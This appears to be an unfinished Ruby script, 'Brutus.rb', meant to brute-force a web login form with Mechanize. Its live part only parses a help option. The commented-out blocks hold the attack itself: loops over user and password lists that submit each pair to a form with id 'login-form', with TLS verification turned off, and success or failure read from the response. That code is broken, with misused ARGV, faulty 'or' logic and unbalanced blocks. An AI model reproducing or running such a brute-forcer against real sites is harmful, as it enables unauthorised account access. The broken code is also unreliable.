#!/usr/bin/env ruby

require 'rubygems'
require 'mechanize'
require 'optparse'

#this script will brute force a desired web form 
options = {}
OptionParser.new do |opts|
    opts.banner = "Usage: ruby Brutus.rb [options]"

    opts.on("-h", "--help", "Display help") do |h|
        options[:help] = h
    end 
end.parse!
p options 
p ARGV


=begin   options[:url] = url 
    options[:user_list] = U
    options[:password_list] = P
    

    end
end.parse! 

p options 
p ARGV


    if ARGV.empty?
        puts "Need Help? Try ruby Brutus.rb --help"
    else 
        puts "Proceeding with password attack!"
        exit
        end
    end
end 
=end 


=begin 
userlist = File.open(ARGV)
passwordlist = File.open(ARGV)
agent = Mechanize.new{|a| 
    a.verify_mode = OpenSSL::SSL::VERIFY_NONE
    #a.set_proxy('localhost',8080)
    }
target = ARGV
user = ARGV
password = ARGV


userlist.each do |username|
passwordlist.each do |password|
    page  = agent.get target

    # Fill out the login form
    form          = page.form_with :id => 'login-form'
    form.username = user or username.chomp
    form.passwd   = password or password.chomp #this is important otherwise the newline will break the auth and everything fails
    result = form.submit

    case
    when result.body =~ /"success" : false/ then puts "Failure with #{password}"
    when result.body =~ /"success" : true/ then puts "SUCCESSFUL LOGIN WITH #{password}"
    else puts "Unknown response body when using \"#{password}\": #{result.body}"
    end
end

=end
